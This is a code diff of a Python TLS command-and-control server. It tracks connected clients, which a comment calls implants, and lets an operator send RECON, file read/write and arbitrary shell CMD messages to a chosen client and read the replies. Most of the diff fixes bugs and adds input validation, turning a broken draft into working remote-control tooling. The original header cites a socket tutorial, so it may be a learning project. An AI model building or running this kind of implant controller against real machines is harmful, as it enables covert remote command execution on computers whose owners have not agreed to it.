@@ -1,79 +1,124 @@
-# https://www.geeksforgeeks.org/python/socket-programming-python/
+# server.py (command‑first syntax: HELO 0 | RECON 0 | CMD 0 ls)
 import socket
 import ssl
 import random
 import threading
 
-host = '0.0.0.0' # Open to anyone on the same wifi
+host = '0.0.0.0'  # Open to anyone on the same wifi
 port = 8888
 
 types = ['HELO', 'EXIT', 'READ', 'RITE', 'CMD', 'ERR', 'RECON']
 
 lock = threading.Lock()
-addresses = [ ]
+addresses = []
 
+# ----------------------------------------------------------------------
+# Server‑local helpers
+# ----------------------------------------------------------------------
+def list_connections():
+    with lock:
+        if not addresses:
+            print("No connections yet.")
+            return
+        print("List of connections:")
+        for idx, (addr, _) in enumerate(addresses):
+            print(f"\t[{idx}]: {addr}")
+
+def show_help():
+    print("Usage: <command> <connection_id> [params...]")
+    print("Server commands (no ID): 'help', 'listconns'")
+    print("Client commands: HELO, EXIT, CMD <cmd>, RECON")
+    print("Examples: HELO 0")
+    print("          RECON 0")
+    print("          CMD 0 ls")
+
+# ----------------------------------------------------------------------
+# Command input thread
+# ----------------------------------------------------------------------
 def parseAndSendInput():
     while True:
-        user_input = input('> ')
-
-        user_input = user_input.split(' ')
-
         try:
-            type = user_input[0]
+            raw = input('> ')
+            user_input = raw.split()
+            if not user_input:
+                continue
 
-            # handle server exclusive commands
-            if type is 'listconns':
-                print("List of connections:\n")
-                idx = 0
-                for e in addresses:
-                    print(f"\t[{idx}]: {addr}", idx, addresses[0])
-                    idx += 1
-                return
+            command = user_input[0]
 
-            if type is 'help':
-                print("Usage: [server command] [connection id] [params...]"
-                      "Server local commands: \'help\', \'listconns\' "
-                      "Client affecting commands: \'HELO\', \'EXIT\', \'READ\', \'RITE\', \'CMD\', \'ERR\', \'RECON\'")
-                return
+            # ---- server‑local commands (no ID) ----
+            if command == 'listconns':
+                list_connections()
+                continue
+            if command == 'help':
+                show_help()
+                continue
 
-            id = str(random.randint(0, 10 ** 9))
-            addressIdx = user_input[1]
-            connection = addresses[int(addressIdx)][1]
+            # ---- client commands require at least an index ----
+            if len(user_input) < 2:
+                print("Error: missing connection index. Use '<command> <id>'")
+                show_help()
+                continue
 
-            # handle server -> client commands
-            data = " ".join(user_input[2:])
-            assert type in types, f"unknown type {type} of length {len(type)}"
-            if type in ['READ', 'RITE', 'CMD']:
-                assert(data != '')
-            else:
-                assert(data == '')
+            index_str = user_input[1]
+            try:
+                idx = int(index_str)
+            except ValueError:
+                print(f"Invalid connection index '{index_str}'. Use an integer.")
+                continue
 
-            connection.send(("  ".join([type, id, data])).encode())
-        except:
-            print("Something went wrong. Type 'help' for details on usage.")
+            with lock:
+                if idx >= len(addresses):
+                    print(f"No connection at index {idx}")
+                    continue
+                addr, conn = addresses[idx]
 
-    
+            msg_type = command.upper()
+            if msg_type not in types:
+                print(f"Unknown command type: {msg_type}")
+                show_help()
+                continue
 
+            # Build message
+            msg_id = str(random.randint(0, 10**9))
+            data = " ".join(user_input[2:]) if len(user_input) > 2 else ""
+
+            if msg_type in ['READ', 'RITE', 'CMD'] and not data:
+                print(f"{msg_type} requires additional arguments")
+                continue
+            if msg_type not in ['READ', 'RITE', 'CMD'] and data:
+                print(f"{msg_type} should not have arguments")
+                continue
+
+            payload = "  ".join([msg_type, msg_id, data]).encode()
+            with lock:
+                conn.send(payload)
+
+        except Exception as e:
+            print(f"Something went wrong: {e}")
+            show_help()
+
+# ----------------------------------------------------------------------
+# Message receiving thread (prints replies from implant)
+# ----------------------------------------------------------------------
 def receiveMessage(c: ssl.SSLSocket):
     while True:
-        data = c.recv(1024)
-        if not data:
-            print("Disconnected")
-            break
-
         try:
+            data = c.recv(1024)
+            if not data:
+                print("Disconnected")
+                break
             response = data.decode().replace('\\n', '\n')
+            print(f"Received: {response}")
         except Exception as e:
             print(f"[!] Error decoding response: {e}")
             break
 
-        print(f"Received message: {response}")
-
-# Create SSL context for the server
+# ----------------------------------------------------------------------
+# Main server setup
+# ----------------------------------------------------------------------
 ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 ssl_context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
 
-# Set up a socket and listen for a connection
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
     raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     raw_socket.bind((host, port))
@@ -81,14 +126,12 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
     print(f"Listening on {host}:{port} (TLS)")
 
     with ssl_context.wrap_socket(raw_socket, server_side=True) as s:
+        # Start the interactive command thread (no args)
+        threading.Thread(target=parseAndSendInput, daemon=True).start()
 
-        # While true, accept new connections and register them 
-        threading.Thread(target=parseAndSendInput, args=(), daemon=True).start()
         while True:
             c, a = s.accept()
-
-            with c:
-                threading.Thread(target=receiveMessage, args=(c,), daemon=True).start()
-                print(f"Connected to {a}")
-                with lock:
-                    addresses.append((a, c))
+            print(f"Connected to {a}")
+            with lock:
+                addresses.append((a, c))
+            threading.Thread(target=receiveMessage, args=(c,), daemon=True).start()
